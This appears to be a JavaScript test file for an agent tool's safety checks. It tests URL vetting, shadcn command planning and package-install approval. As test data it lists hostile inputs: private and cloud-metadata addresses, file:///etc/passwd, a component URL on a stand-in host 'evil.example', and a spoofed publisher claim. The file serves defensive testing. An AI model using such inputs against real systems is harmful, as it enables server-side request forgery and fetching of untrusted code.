import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isPublicUrl } from '../src/github.mjs';
import { planProjectCommand } from '../src/projects.mjs';

test('source checks never reach local or private addresses', async () => {
  for (const u of ['http://127.0.0.1/', 'http://10.0.0.1/', 'http://192.168.1.1/admin', 'http://169.254.169.254/latest', 'http://[::1]/', 'http://172.16.0.5/', 'file:///etc/passwd', 'http://100.64.0.1/'])
    assert.equal(await isPublicUrl(u), false, u);
  assert.equal(await isPublicUrl('http://8.8.8.8/'), true);
});

test('shadcn targets from a README must be registry names', () => {
  const project = { ecosystems: [{ id: 'js' }] };
  assert.deepEqual(planProjectCommand('npx shadcn@latest add button', project).args, ['--yes', 'shadcn@latest', 'add', 'button', '--yes']);
  assert.ok(planProjectCommand('npx shadcn@latest add @magicui/marquee', project).cmd);
  assert.ok(planProjectCommand('npx shadcn@latest add https://evil.example/r/x.json', project).error);
  assert.ok(planProjectCommand('npx shadcn@latest add --overwrite', project).error);
  assert.equal(planProjectCommand('npx shadcn@latest add <component>', project).needs, 'component');
});

test('a package install request cannot claim its own provenance or publisher', async () => {
  const { sandbox } = await import('./helpers.mjs');
  sandbox('pkgspoof');
  const { openDb } = await import('../src/db.mjs');
  const db = openDb();
  const { grantMode } = await import('../src/policy.mjs');
  grantMode(db, 'maximum');
  const ops = await import('../src/operations.mjs');
  await import('../src/handlers.mjs');
  const p = await ops.preview(db, 'package.install', { manager: 'npm', name: 'squatted-cli', resource_id: 'gh:nobody/nothing', evidence: 'registry', publisher: 'anthropics' });
  assert.equal(p.decision, 'ask');
  db.close();
});

test('skill installs work without git: the commit comes from GitHub when git is missing', async () => {
  const { lsRemote } = await import('../src/github.mjs');
  const saved = process.env.PATH;
  process.env.PATH = '';
  try {
    const r = await lsRemote('https://github.com/anthropics/skills.git');
    assert.ok(r.exists === true && /^[0-9a-f]{40}$/.test(r.head) || r.exists === null, JSON.stringify(r));
  } finally { process.env.PATH = saved; }
});
